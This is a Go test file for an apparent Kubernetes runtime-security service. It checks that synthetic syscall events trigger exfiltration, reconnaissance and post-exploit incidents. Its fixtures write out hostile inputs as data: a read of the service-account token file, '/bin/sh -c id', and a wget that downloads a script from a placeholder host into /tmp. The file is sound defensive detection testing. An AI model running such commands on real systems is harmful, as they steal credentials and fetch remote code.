package api

import (
	"bytes"
	"encoding/json"
	"fmt"
	"net/http"
	"net/http/httptest"
	"testing"

	"github.com/gin-gonic/gin"
	"github.com/glebarez/sqlite"
	"gorm.io/gorm"

	"github.com/fortuna/core/internal/middleware"
	"github.com/fortuna/core/pkg/models"
)

func useAdminTestPrincipal(r *gin.Engine) {
	r.Use(func(c *gin.Context) {
		c.Set("user", &models.User{Role: models.RoleAdmin})
		c.Next()
	})
}

// TestRuntimeFlow_AgentToCoreToDBToV2API verifies end-to-end flow:
// agent-shape payload -> core REP processing -> DB facts/incidents -> v2 read API.
func TestRuntimeFlow_AgentToCoreToDBToV2API(t *testing.T) {
	gin.SetMode(gin.TestMode)
	db, err := gorm.Open(sqlite.Open(":memory:"), &gorm.Config{})
	if err != nil {
		t.Fatalf("db: %v", err)
	}
	if err := db.AutoMigrate(
		&models.Pod{},
		&models.RuntimeEvent{},
		&models.RuntimeSignal{},
		&models.RuntimeBehaviorFact{},
		&models.RuntimeIncident{},
		&models.PodRiskProfile{},
	); err != nil {
		t.Fatalf("migrate: %v", err)
	}

	podUID := "eeeeeeee-eeee-eeee-eeee-eeeeeeeeeeee"
	clusterID := "c1"
	if err := db.Create(&models.Pod{UID: podUID, Name: "demo", Namespace: "ns", ClusterID: clusterID}).Error; err != nil {
		t.Fatalf("seed pod: %v", err)
	}

	r := gin.New()
	useAdminTestPrincipal(r)
	useRuntimeAgentPrincipal(r, clusterID)
	r.POST("/api/v2/runtime/events", requireScopedRuntimeOwnership(db), PostRuntimeEventsV2Scoped(db))
	r.GET("/api/v2/runtime/pods/:uid/facts", middleware.RequirePodUIDClusterScope(db, "uid"), GetPodRuntimeBehaviorFactsScoped(db))
	r.GET("/api/v2/runtime/pods/:uid/incidents", middleware.RequirePodUIDClusterScope(db, "uid"), GetPodRuntimeIncidentsScoped(db))
	payload := []map[string]interface{}{
		{
			"source_record_id": "dddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd",
			"pod": map[string]interface{}{
				"uid":       podUID,
				"namespace": "ns",
				"name":      "demo",
			},
			"syscall":    "openat",
			"target":     "/var/run/secrets/kubernetes.io/serviceaccount/token",
			"confidence": 0.9,
		},
		{
			"source_record_id": "eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee",
			"pod": map[string]interface{}{
				"uid":       podUID,
				"namespace": "ns",
				"name":      "demo",
			},
			"syscall":    "connect",
			"target":     "dst=8.8.8.8:53 proto=udp dport=53",
			"confidence": 0.9,
		},
	}
	body, _ := json.Marshal(payload)
	req := httptest.NewRequest(http.MethodPost, "/api/v2/runtime/events", bytes.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	w := httptest.NewRecorder()
	r.ServeHTTP(w, req)
	if w.Code != http.StatusOK {
		t.Fatalf("post status %d: %s", w.Code, w.Body.String())
	}

	// DB verify: incidents should contain EXFIL_LIKE_SEQUENCE from REP-C.
	var incidentsDB []models.RuntimeIncident
	if err := db.Where("cluster_id = ? AND pod_uid = ?", clusterID, podUID).Find(&incidentsDB).Error; err != nil {
		t.Fatalf("query incidents: %v", err)
	}
	if len(incidentsDB) == 0 {
		t.Fatalf("expected at least 1 incident in db, got 0")
	}

	// API verify: facts endpoint
	wFacts := httptest.NewRecorder()
	reqFacts := httptest.NewRequest(http.MethodGet, "/api/v2/runtime/pods/"+podUID+"/facts?limit=50", nil)
	r.ServeHTTP(wFacts, reqFacts)
	if wFacts.Code != http.StatusOK {
		t.Fatalf("facts status %d: %s", wFacts.Code, wFacts.Body.String())
	}
	var factsResp map[string]interface{}
	if err := json.Unmarshal(wFacts.Body.Bytes(), &factsResp); err != nil {
		t.Fatalf("facts unmarshal: %v", err)
	}
	if int(factsResp["total"].(float64)) == 0 {
		t.Fatalf("facts total expected >0, got 0")
	}

	// API verify: incidents endpoint
	wInc := httptest.NewRecorder()
	reqInc := httptest.NewRequest(http.MethodGet, "/api/v2/runtime/pods/"+podUID+"/incidents?limit=50", nil)
	r.ServeHTTP(wInc, reqInc)
	if wInc.Code != http.StatusOK {
		t.Fatalf("incidents status %d: %s", wInc.Code, wInc.Body.String())
	}
	var incResp map[string]interface{}
	if err := json.Unmarshal(wInc.Body.Bytes(), &incResp); err != nil {
		t.Fatalf("incidents unmarshal: %v", err)
	}
	if int(incResp["total"].(float64)) == 0 {
		t.Fatalf("incidents total expected >0, got 0")
	}
}

func TestRuntimeFlow_StatefulIncidents_ReconAndPostExploit(t *testing.T) {
	gin.SetMode(gin.TestMode)
	db, err := gorm.Open(sqlite.Open(":memory:"), &gorm.Config{})
	if err != nil {
		t.Fatalf("db: %v", err)
	}
	if err := db.AutoMigrate(
		&models.Pod{},
		&models.RuntimeEvent{},
		&models.RuntimeSignal{},
		&models.RuntimeBehaviorFact{},
		&models.RuntimeIncident{},
		&models.PodRiskProfile{},
	); err != nil {
		t.Fatalf("migrate: %v", err)
	}

	podUID := "iiiiiiii-iiii-iiii-iiii-iiiiiiiiiiii"
	clusterID := "c1"
	if err := db.Create(&models.Pod{UID: podUID, Name: "demo", Namespace: "ns", ClusterID: clusterID}).Error; err != nil {
		t.Fatalf("seed pod: %v", err)
	}

	r := gin.New()
	useAdminTestPrincipal(r)
	useRuntimeAgentPrincipal(r, clusterID)
	r.POST("/api/v2/runtime/events", requireScopedRuntimeOwnership(db), PostRuntimeEventsV2Scoped(db))
	r.GET("/api/v2/runtime/pods/:uid/incidents", middleware.RequirePodUIDClusterScope(db, "uid"), GetPodRuntimeIncidentsScoped(db))

	basePod := map[string]interface{}{
		"uid":       podUID,
		"namespace": "ns",
		"name":      "demo",
	}

	// Emit enough network connects to trigger RECON_BURST.
	var payload []map[string]interface{}
	for i := 0; i < 6; i++ {
		payload = append(payload, map[string]interface{}{
			"source_record_id": fmt.Sprintf("%064x", i+1),
			"pod":              basePod,
			"syscall":          "connect",
			"target":           "dst=8.8.8.8:53 proto=udp dport=53",
			"confidence":       0.9,
		})
	}
	// Emit execution chain to trigger POST_EXPLOIT_EXEC_CHAIN:
	// - /bin/sh => INTERACTIVE_SHELL
	// - /tmp/wget => TMP_BINARY_EXEC + REMOTE_TOOL_EXEC
	payload = append(payload,
		map[string]interface{}{"source_record_id": fmt.Sprintf("%064x", 100), "pod": basePod, "syscall": "execve", "target": "/bin/sh -c id", "confidence": 0.9},
		map[string]interface{}{"source_record_id": fmt.Sprintf("%064x", 101), "pod": basePod, "syscall": "execve", "target": "/tmp/wget http://x/p.sh -O /tmp/p.sh", "confidence": 0.9},
	)

	body, _ := json.Marshal(payload)
	req := httptest.NewRequest(http.MethodPost, "/api/v2/runtime/events", bytes.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	w := httptest.NewRecorder()
	r.ServeHTTP(w, req)
	if w.Code != http.StatusOK {
		t.Fatalf("post status %d: %s", w.Code, w.Body.String())
	}

	wInc := httptest.NewRecorder()
	reqInc := httptest.NewRequest(http.MethodGet, "/api/v2/runtime/pods/"+podUID+"/incidents?limit=50", nil)
	r.ServeHTTP(wInc, reqInc)
	if wInc.Code != http.StatusOK {
		t.Fatalf("incidents status %d: %s", wInc.Code, wInc.Body.String())
	}
	var incResp map[string]interface{}
	if err := json.Unmarshal(wInc.Body.Bytes(), &incResp); err != nil {
		t.Fatalf("incidents unmarshal: %v", err)
	}

	items, _ := incResp["incidents"].([]interface{})
	foundRecon := false
	foundPostExploit := false
	for _, it := range items {
		row, _ := it.(map[string]interface{})
		typ, _ := row["incidentType"].(string)
		if typ == "RECON_BURST" {
			foundRecon = true
		}
		if typ == "POST_EXPLOIT_EXEC_CHAIN" {
			foundPostExploit = true
		}
	}
	if !foundRecon || !foundPostExploit {
		t.Fatalf("expected RECON_BURST and POST_EXPLOIT_EXEC_CHAIN incidents, got body=%s", wInc.Body.String())
	}
}
